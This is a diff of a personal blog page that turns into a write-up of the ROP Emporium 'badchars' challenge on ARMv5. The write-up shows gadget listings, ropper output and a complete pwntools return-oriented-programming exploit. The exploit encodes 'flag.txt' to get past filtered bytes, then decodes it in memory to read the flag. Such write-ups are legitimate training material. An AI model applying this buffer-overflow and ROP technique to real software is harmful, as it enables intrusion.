@@ -6,11 +6,10 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
-  <title>About</title>
-  <meta name='description' content='• Windows Internals • Reverse Engineering  • Malware Analysis • Exploit Development
-'>
+  <title>badchars - ROP Emporium</title>
+  <meta name='description' content='ROP ARMv5 writeup'>
 
-  <link rel="canonical" href="http://localhost:4000/about/">
+  <link rel="canonical" href="http://localhost:4000/2023/05/24/ROP-Emporium-badchars/">
   <link rel="alternate" type="application/rss+xml" title="Семёрка" href="/feed.xml">
 
   <!-- Fonts -->
@@ -33,7 +32,7 @@
   
 
 <!-- begin header -->
-<header class="header header--top">
+<header class="header ">
   <div class="container">
     <div class="row">
       <div class="header__inner col col-12">
@@ -257,57 +256,474 @@
 
   <!-- begin content -->
   <main class="content" aria-label="Content">
-    <!-- begin hero -->
-
-<section class="hero">
-  <div class="hero__inner">
-    <div class="hero__image">
-      <img class="lazy" data-src="/images/querysysteminfo.png" alt="About">
-    </div>
-    <div class="hero__content">
-      <h1 class="hero__title">About</h1>
+    <div class="post-head">
+  <div class="container">
+    <div class="row">
+      
+      <div class="col col-6 col-t-12">
+        <div class="image-box">
+          <img class="post-image lazy" data-src="/media/posts_thumb/badchars.png" alt="badchars - ROP Emporium">
+        </div>
+      </div>
+      
+  
+      <div class="col col-6 col-t-12">
+        <div class="post-head__box">
+        
+          <div class="post__meta">
+            <span class="post__minutes">
+              
+              
+                14 min read
+              
+              <time class="post__date"
+                datetime="2023-05-24T18:00:30-03:00">May 24, 2023</time>
+            </span>
+          </div>
+        
+          <h2 class="post__title">badchars - ROP Emporium</h2>
+        
+          <div class="post__bottom">
+        
+            <div class="post__author">
+              <a href="/about/" aria-label="Sanya"><img class="post__author-image"
+                  src="/images/15.png" alt="Sanya's Picture"></a>
+            </div>
+        
+            <div class="post__bottom-meta">
+              <a href="/about/" class="post__author-link">Sanya</a>
+              
+            </div>
+          </div>
+        
+        </div>
+      </div>
     </div>
   </div>
-</section>
+</div>
 
-<!-- begin hero -->
-
-<!-- begin page -->
+<!-- begin post -->
 <div class="container">
-  <article class="page animate">
-    <div class="page__content">
-      <p>Yo!</p>
+  <article class="post animate">
 
-<p>This is my website, I love low level stuff.
-I hope you find this blog interesting and learn something new…</p>
+    <div class="post__content">
+      <h1 id="rop-emporium---badchars-armv5-solution">ROP Emporium - badchars ARMv5 solution</h1>
 
-<p>The articles are usually written in russian and english.</p>
+<p>Alrighty, this one is a little harder than the write4 challenge.</p>
 
-<p>My main interests are:</p>
+<p>Like before we have to call the <strong>usefulFunction</strong> listed bellow with the <em>flag.txt</em> string:</p>
 
-<ul>
-  <li>Malware</li>
-  <li>Reverse Engineering</li>
-  <li>Windows Internals</li>
-  <li>Exploit Development</li>
-  <li>Kernel Development</li>
-  <li>Software Development</li>
-  <li>CTFs</li>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>disassemble usefulFunction
+Dump of assembler code for function usefulFunction:
+   0x000105d4 &lt;+0&gt;:    push    {r11, lr}
+   0x000105d8 &lt;+4&gt;:    add    r11, sp, #4
+   0x000105dc &lt;+8&gt;:    ldr    r0, [pc, #8]    @ 0x105ec &lt;usefulFunction+24&gt;
+   0x000105e0 &lt;+12&gt;:    bl    0x104b4 &lt;print_file@plt&gt;
+   0x000105e4 &lt;+16&gt;:    nop   		 @ (mov r0, r0)
+   0x000105e8 &lt;+20&gt;:    pop    {r11, pc}
+   0x000105ec &lt;+24&gt;:    muleq    r1, r8, r6
+
+</code></pre></div></div>
+
+<p>We have to follow the calling convention for ARMv5 which dictates that the first arguments are supposed to be in R0, R1, R2 and R3 respectively.</p>
+
+<p>Upon further inspection, the binary spills out the bad characters which will get filtered out:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>badchars are: 'x', 'g', 'a', '.' --&gt; 7867612e
+</code></pre></div></div>
+
+<p>So here we can already see the problem. 3 characters of the <em>flag.txt</em> string will be blocked, we need to encode them somehow.</p>
+
+<h2 id="whats-our-task">What’s our task?</h2>
+
+<p>To solve this level we need to accomplish the following:</p>
+
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Write the encoded string into memory</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Decode the encoded string</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Call our <strong>usefulFunction</strong> with the decoded string to get our flag</li>
 </ul>
 
-<p><img src="/images/yep.png" alt="grandma" /></p>
+<p>There are a few different gadgets we can use to decode an encoded string:</p>
 
-<h2 id="follow-me">Follow me</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>disassemble usefulGadgets
+  Dump of assembler code for function usefulGadgets:
+  
+  SUB GADGET:
+   0x000105f0 &lt;+0&gt;:    ldr    r1, [r5]
+   0x000105f4 &lt;+4&gt;:    sub    r1, r1, r6
+   0x000105f8 &lt;+8&gt;:    str    r1, [r5]
+   0x000105fc &lt;+12&gt;:    pop    {r0, pc}
+   
+   ADD GADGET:
+   0x00010600 &lt;+16&gt;:    ldr    r1, [r5]
+   0x00010604 &lt;+20&gt;:    add    r1, r1, r6
+   0x00010608 &lt;+24&gt;:    str    r1, [r5]
+   0x0001060c &lt;+28&gt;:    pop    {r0, pc}
+   
+   STORE GADGET:
+   0x00010610 &lt;+32&gt;:    str    r3, [r4]
+   0x00010614 &lt;+36&gt;:    pop    {r5, r6, pc}
+   
+   OR GADGET:
+   0x00010618 &lt;+40&gt;:    ldr    r1, [r5]
+   0x0001061c &lt;+44&gt;:    eor    r1, r1, r6
+   0x00010620 &lt;+48&gt;:    str    r1, [r5]
+   0x00010624 &lt;+52&gt;:    pop    {r0, pc}
 
-<ul>
-  <li><a href="https://twitter.com/KiFastSyscall">Twitter</a></li>
-  <li><a href="https://github.com/NtSanya">Github</a></li>
+</code></pre></div></div>
+
+<p>With the help of these gadgets we can decode a string using subtraction, addition or logical OR.</p>
+
+<p>I’ll shift the <em>flag.txt</em> by one so I’ll be using the <strong>ADD GADGET</strong></p>
+
+<h2 id="encoded-string-flagtxt---1--ekf-sws">Encoded string: flag.txt - 1 = ek`f-sws</h2>
+
+<p>Now when the binary asks for input, we can successfully get this encoded string to memory without getting any of the characters filtered out.</p>
+
+<p>After that all that’s left is to use the <strong>ADD GADGET</strong> to decoded it back and call our <strong>usefulFunction</strong> to print the contents of the flag.</p>
+
+<h2 id="controlling-the-pc-register">Controlling the PC register</h2>
+
+<p>To find out how many bytes we need in order to control the flow of execution we can use the following snipet:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">find_pc_offset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">alpha</span><span class="p">):</span>
+   <span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
+   <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+   <span class="n">io</span><span class="p">.</span><span class="nf">wait</span><span class="p">()</span> <span class="c1"># wait for crash
+</span>   <span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+   <span class="n">pc_value</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">pc</span>
+   <span class="n">pc_offset</span> <span class="o">=</span> <span class="nf">cyclic_find</span><span class="p">(</span><span class="n">pc_value</span><span class="p">,</span> <span class="n">alphabet</span><span class="o">=</span><span class="n">alpha</span><span class="p">)</span>
+
+
+   <span class="nf">info</span><span class="p">(</span><span class="s">"Found PC offset at: %#x"</span><span class="p">,</span> <span class="n">pc_offset</span><span class="p">)</span>
+   <span class="k">return</span> <span class="n">pc_offset</span>
+
+
+<span class="c1"># badchars are: 'x', 'g', 'a', '.'
+# python -c 'from pwn import *; print(enhex(b"xga."))' = 7867612e
+</span><span class="n">alpha</span> <span class="o">=</span> <span class="s">'bcde'</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="nf">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">alphabet</span><span class="o">=</span><span class="n">alpha</span><span class="p">)</span>
+<span class="n">pc_offset</span> <span class="o">=</span> <span class="nf">find_pc_offset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">alpha</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>So after 44 (0x2c) bytes we can redirect the execution to our gadgets</p>
+
+<h2 id="building-the-gadget">Building the gadget</h2>
+
+<p>First things first, we need to store our encoded string <em>somewhere</em> using the <strong>STORE GADGET</strong> listed bellow:</p>
+
+<pre><code class="language-assembly"> STORE GADGET:
+   0x00010610 &lt;+32&gt;:    str    r3, [r4]
+   0x00010614 &lt;+36&gt;:    pop    {r5, r6, pc}
+</code></pre>
+
+<p>The string <em>flag.txt</em> or rather <em>ek`f-sws</em> is 8 bytes long, where can we store this inside the target binary?</p>
+
+<p>We can check out the ELF sections for the target:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>readelf -S badchars_armv5
+There are 29 section headers, starting at offset 0x1bb4:
+
+Заголовки разделов:
+  [Нм] Имя           	Тип         	Адрес	Смещ   Разм   ES Флг Сс Инф Al
+  [ 0]               	NULL        	00000000 000000 000000 00  	0   0  0
+  [ 1] .interp       	PROGBITS    	00010154 000154 000013 00   A  0   0  1
+  [ 2] .note.ABI-tag 	NOTE        	00010168 000168 000020 00   A  0   0  4
+  [ 3] .note.gnu.bu[...] NOTE        	00010188 000188 000024 00   A  0   0  4
+  [ 4] .gnu.hash     	GNU_HASH    	000101ac 0001ac 000060 04   A  5   0  4
+  [ 5] .dynsym       	DYNSYM      	0001020c 00020c 000110 10   A  6   1  4
+  [ 6] .dynstr       	STRTAB      	0001031c 00031c 0000e0 00   A  0   0  1
+  [ 7] .gnu.version  	VERSYM      	000103fc 0003fc 000022 02   A  5   0  2
+  [ 8] .gnu.version_r	VERNEED     	00010420 000420 000020 00   A  6   1  4
+  [ 9] .rel.dyn      	REL         	00010440 000440 000008 08   A  5   0  4
+  [10] .rel.plt      	REL         	00010448 000448 000028 08  AI  5  21  4
+  [11] .init         	PROGBITS    	00010470 000470 00000c 00  AX  0   0  4
+  [12] .plt          	PROGBITS    	0001047c 00047c 000050 04  AX  0   0  4
+  [13] .text         	PROGBITS    	000104cc 0004cc 0001c0 00  AX  0   0  4
+  [14] .fini         	PROGBITS    	0001068c 00068c 000008 00  AX  0   0  4
+  [15] .rodata       	PROGBITS    	00010694 000694 000010 00   A  0   0  4
+  [16] .ARM.exidx    	ARM_EXIDX   	000106a4 0006a4 000008 00  AL 13   0  4
+  [17] .eh_frame     	PROGBITS    	000106ac 0006ac 000004 00   A  0   0  4
+  [18] .init_array   	INIT_ARRAY  	00020f00 000f00 000004 04  WA  0   0  4
+  [19] .fini_array   	FINI_ARRAY  	00020f04 000f04 000004 04  WA  0   0  4
+  [20] .dynamic      	DYNAMIC     	00020f08 000f08 0000f8 08  WA  6   0  4
+  [21] .got          	PROGBITS    	00021000 001000 000024 04  WA  0   0  4
+  [22] .data         	PROGBITS    	00021024 001024 000008 00  WA  0   0  4
+  [23] .bss          	NOBITS      	0002102c 00102c 000004 00  WA  0   0  1
+  [24] .comment      	PROGBITS    	00000000 00102c 000030 01  MS  0   0  1
+  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 00105c 000028 00  	0   0  1
+  [26] .symtab       	SYMTAB      	00000000 001084 0006d0 10 	27  84  4
+  [27] .strtab       	STRTAB      	00000000 001754 000358 00  	0   0  1
+  [28] .shstrtab     	STRTAB      	00000000 001aac 000105 00  	0   0  1
+</code></pre></div></div>
+
+<p>The data section at [22] has exactly the 8 bytes we need!</p>
+
+<p>What needs to be done now is to get the address of the data section into <strong>R4</strong> and the encoded string into <strong>R3</strong> for the <strong>STORE GAGDET</strong></p>
+
+<p>Let’s use ropper to see if we can find gadgets to POP into these registers.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper --file=badchars_armv5 --search "pop"
+
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop
+
+
+[INFO] File: badchars_armv5
+0x000105d0: pop {fp, pc};
+0x000105fc: pop {r0, pc};
+0x00010478: pop {r3, pc};
+0x000105b0: pop {r4, pc};
+0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc};
+0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r8, asr #17; andeq r0, r1, r0, asr #17; bx lr;
+0x00010614: pop {r5, r6, pc};
+0x000105a0: popne {r4, pc}; bl #0x52c; mov r3, #1; strb r3, [r4]; pop {r4, pc};
+
+</code></pre></div></div>
+
+<p>Notice anything strange? The <strong>pop {r3, pc};</strong> gadget is at <strong>0x00010478</strong> but this address contains <strong>0x78</strong> which is one of our bad characters (<strong>7867612e</strong>), therefore we cannot use this gadget.</p>
+
+<p>Luckily as stated in the challenge page, ropper has a bad characters option to help us here:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ropper --file=badchars_armv5 --search "pop" -b 7867612e
+[INFO] Load gadgets from cache
+[LOAD] loading... 100%
+[LOAD] filtering badbytes... 100%
+[LOAD] removing double gadgets... 100%
+[INFO] Searching for gadgets: pop
+
+
+[INFO] File: badchars_armv5
+0x000105d0: pop {fp, pc};
+0x000105fc: pop {r0, pc};
+0x00010690: pop {r3, pc};
+0x000105b0: pop {r4, pc};
+0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc};
+0x0001067c: pop {r4, r5, r6, r7, r8, sb, sl, pc}; andeq r0, r1, r8, asr #17; andeq r0, r1, r0, asr #17; bx lr;
+0x00010614: pop {r5, r6, pc};
+0x000105a0: popne {r4, pc}; bl #0x52c; mov r3, #1; strb r3, [r4]; pop {r4, pc};
+
+</code></pre></div></div>
+
+<p>There we go!  <strong>0x00010690: pop {r3, pc};</strong> is a much better gadget and won’t cause us any problems</p>
+
+<p>Remember that we’re dealing with 4 byte registers so to store our 8 byte-encoded flag we need to call the storage gadget twice:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">encoded_flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'ek`f-sws'</span>
+
+<span class="c1"># write first 4 bytes of encoded flag
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">pc_offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_r3_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">encoded_flag</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_r4_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">storage_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span><span class="p">)</span><span class="c1"># r5
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># r6
+</span>
+<span class="c1"># write remaining 4 bytes of the encoded flag
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_r3_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">encoded_flag</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_r4_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">storage_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span><span class="p">)</span><span class="c1"># r5
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># r6
+</span></code></pre></div></div>
+
+<p>The <strong>STORE GADGET</strong> also pops into <strong>R5</strong> and <strong>R6</strong> which will be used by the <strong>ADD GADGET</strong>. Thus, when storing the flag in data section we already pop the right values (<strong>datasection_addr</strong> and <strong>0x1</strong> since our encoded flag was shifted by one as described earlier).</p>
+
+<p>Ok, so we’re done with first step. Now we need to decode this string back to its original form before calling our function</p>
+
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Write the encoded string into memory</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Decode the encoded string</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Call our <strong>usefulFunction</strong> with the decoded string to get our flag</li>
 </ul>
+
+<h2 id="the-add-gadget">The ADD Gadget</h2>
+
+<p>Now that our encoded string is inside the data section we can use the <strong>ADD GADGET</strong> to decode it:</p>
+
+<pre><code class="language-assembly">
+   0x00010600 &lt;+16&gt;:    ldr    r1, [r5]
+   0x00010604 &lt;+20&gt;:    add    r1, r1, r6
+   0x00010608 &lt;+24&gt;:    str    r1, [r5]
+   0x0001060c &lt;+28&gt;:    pop    {r0, pc}
+</code></pre>
+
+<p>For this gadget to work we need to store the data section address into <strong>R5</strong> and 0x1 into <strong>R6</strong>, that way it’ll shift the string <strong>ek`f-sws</strong> back to <strong>flag.txt</strong>.</p>
+
+<p>This has been done already in the previous step when setting up the <strong>STORE GADGET</strong>. However this gadget will only decode one byte at a time, so we can use the following snipet to decoded the whole string:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">add_xploit</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">encoded_flag</span><span class="p">)):</span>
+   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="n">pop_r5_r6_gadget</span>
+   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># shift back
+</span>   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="n">add_gadget</span>
+   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Nice, now we just need to call <strong>usefulFunction</strong> to get our flag.</p>
+
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Write the encoded string into memory</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Decode the encoded string</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" />Call our <strong>usefulFunction</strong> with the decoded string to get our flag</li>
+</ul>
+
+<p>This should be easy enough, just adding its address to the payload will do:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">+=</span> <span class="n">call_print</span>
+</code></pre></div></div>
+
+<ul class="task-list">
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Write the encoded string into memory</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Decode the encoded string</li>
+  <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked" />Call our <strong>usefulFunction</strong> with the decoded string to get our flag</li>
+</ul>
+
+<h2 id="exploit">Exploit</h2>
+
+<p>Here’s the full exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="s">'badchars_armv5'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'info'</span>
+
+
+<span class="n">gs</span> <span class="o">=</span> <span class="s">'''
+continue
+'''</span>
+
+<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
+   <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
+       <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gs</span><span class="p">)</span>
+   <span class="k">else</span><span class="p">:</span>
+       <span class="k">return</span> <span class="nf">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+  
+<span class="k">def</span> <span class="nf">find_pc_offset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">alpha</span><span class="p">):</span>
+   <span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
+   <span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+   <span class="n">io</span><span class="p">.</span><span class="nf">wait</span><span class="p">()</span> <span class="c1"># wait for crash
+</span>   <span class="n">core</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">corefile</span>
+   <span class="n">pc_value</span> <span class="o">=</span> <span class="n">core</span><span class="p">.</span><span class="n">pc</span>
+   <span class="n">pc_offset</span> <span class="o">=</span> <span class="nf">cyclic_find</span><span class="p">(</span><span class="n">pc_value</span><span class="p">,</span> <span class="n">alphabet</span><span class="o">=</span><span class="n">alpha</span><span class="p">)</span>
+
+
+   <span class="nf">info</span><span class="p">(</span><span class="s">"Found PC offset at: %#x"</span><span class="p">,</span> <span class="n">pc_offset</span><span class="p">)</span>
+   <span class="k">return</span> <span class="n">pc_offset</span>
+
+<span class="c1"># badchars are: 'x', 'g', 'a', '.'
+# python -c 'from pwn import *; print(enhex(b"xga."))' = 7867612e
+</span><span class="n">alpha</span> <span class="o">=</span> <span class="s">'bcde'</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="nf">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">,</span> <span class="n">alphabet</span><span class="o">=</span><span class="n">alpha</span><span class="p">)</span>
+<span class="n">pc_offset</span> <span class="o">=</span> <span class="nf">find_pc_offset</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">alpha</span><span class="p">)</span>
+
+
+<span class="n">io</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
+
+<span class="n">datasection_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__data_start'</span><span class="p">]</span>
+<span class="n">call_print</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x000105e0</span><span class="p">)</span>
+<span class="n">storage_gadget</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x00010610</span><span class="p">)</span>
+<span class="n">add_gadget</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x00010600</span><span class="p">)</span>
+
+<span class="c1"># gadgets
+</span><span class="n">pop_r0_gadget</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x000105fc</span><span class="p">)</span> <span class="c1">#: pop {r0, pc};
+</span><span class="n">pop_r3_gadget</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x00010690</span><span class="p">)</span> <span class="c1"># : pop {r4, pc};
+</span><span class="n">pop_r4_gadget</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x000105b0</span><span class="p">)</span> <span class="c1">#: pop {r4, pc};
+</span><span class="n">pop_r5_r6_gadget</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x00010614</span><span class="p">)</span> <span class="c1">#: pop {r5, r6, pc};
+</span>
+<span class="nf">info</span><span class="p">(</span><span class="s">'%#x - data section'</span><span class="p">,</span> <span class="n">datasection_addr</span><span class="p">)</span>
+
+<span class="c1"># goal: write encoded string to data section
+#flag.txt - 1 -&gt; ek`f-sws
+</span>
+<span class="n">encoded_flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'ek`f-sws'</span>
+
+<span class="c1"># decoded our encoded string
+</span><span class="n">add_xploit</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">encoded_flag</span><span class="p">)):</span>
+   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="n">pop_r5_r6_gadget</span>
+   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span>
+   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span>
+   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="n">add_gadget</span>
+   <span class="n">add_xploit</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span><span class="p">)</span>
+
+<span class="c1"># write first 4 bytes of encoded flag
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span> <span class="o">*</span> <span class="n">pc_offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_r3_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">encoded_flag</span><span class="p">[:</span><span class="mi">4</span><span class="p">]</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_r4_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">storage_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span><span class="p">)</span><span class="c1"># r5
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># r6
+</span>
+<span class="c1"># write remaining 4 bytes of the encoded flag
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_r3_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">encoded_flag</span><span class="p">[</span><span class="mi">4</span><span class="p">:]</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pop_r4_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">storage_gadget</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">datasection_addr</span><span class="p">)</span><span class="c1"># r5
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="c1"># r6
+</span>
+<span class="c1"># decode and pwn
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">add_xploit</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">call_print</span>
+
+<span class="n">io</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="s">"Thank you!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+
+<span class="nf">success</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Execute it and <em>voilà</em>, we got our flag!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] ROPE{a_placeholder_32byte_flag!}
+</code></pre></div></div>
+
 
     </div>
+
+    <div class="post__share">
+      <div class="share__list">
+        <a class="share__link share__facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/2023/05/24/ROP-Emporium-badchars/" onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook" rel="nofollow"><i class="ion ion-logo-facebook"></i></a>
+
